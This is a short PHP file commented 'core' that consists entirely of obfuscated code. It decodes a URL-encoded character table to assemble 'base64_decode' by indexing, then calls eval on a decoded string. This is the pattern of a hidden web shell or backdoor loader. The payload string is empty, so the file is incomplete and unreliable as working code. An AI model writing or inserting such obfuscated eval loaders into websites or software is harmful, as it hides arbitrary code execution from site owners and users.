<?php /*核心*/ $FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$AQPUFiHcNVGkEgJIMLwdRvrjSnKCWstYBpoXzyqaZfOmheTuAbDx=$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{3}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{6}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{33}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{30};$CkxsdSiEbXahPBHTItlNopyeKUAmfGZnqWcYuCDVLJrwzRgQOMvj=$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{33}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{10}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{24}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{10}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{24};$DNiSCaQeKrfGpLZDOngwlIWPMEzUuYmcbyBsTxVAkXjhRdJHFtqv=$CkxsdSiEbXahPBHTItlNopyeKUAmfGZnqWcYuCDVLJrwzRgQOMvj{0}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{18}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{3}.$CkxsdSiEbXahPBHTItlNopyeKUAmfGZnqWcYuCDVLJrwzRgQOMvj{0}.$CkxsdSiEbXahPBHTItlNopyeKUAmfGZnqWcYuCDVLJrwzRgQOMvj{1}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{24};$EVhpZArzvMegnySmkdlTQRwHfGXPaqjDtociBKuEJsYbNxWLFOIU=$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{7}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{13};$AQPUFiHcNVGkEgJIMLwdRvrjSnKCWstYBpoXzyqaZfOmheTuAbDx.=$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{22}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{36}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{29}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{26}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{30}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{32}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{35}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{26}.$FnoAXsMBhpEyaIGCQbLrtcSJZRdTYWUeNlOVqiPHFmfzDuwKjvgx{30};eval($AQPUFiHcNVGkEgJIMLwdRvrjSnKCWstYBpoXzyqaZfOmheTuAbDx("")); ?>